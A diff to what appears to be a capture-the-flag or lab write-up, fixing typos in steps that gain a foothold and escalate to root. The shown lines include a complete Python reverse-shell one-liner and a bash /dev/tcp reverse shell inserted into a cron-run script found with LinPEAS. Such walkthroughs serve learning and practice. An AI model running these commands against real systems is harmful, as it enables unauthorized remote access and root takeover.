@@ -53,9 +53,9 @@ if __name__ == ("__main__"):
   - i run this code to insert in it **reverse shell** (python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip_adress",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])')
   - and listen to the port 
   - now i have access to it
-  - using linPeas script you will there is a file inside crontab run every 5 minute 
+  - using linPeas script you will find there is a file inside crontab run every 5 minute 
   - the file that execute it have inside it another file that we have the access to it
   - we insert in write.sh ** bash -i >& /dev/tcp/192.168.1.65/9999 0>&1 ** and listen to 9999
-  - now wh have the access to the root
+  - now we have the access to the root
   
   # im not fammiliar with this type of write up && the deadline is almost finish , that's why i wrote it like that !!
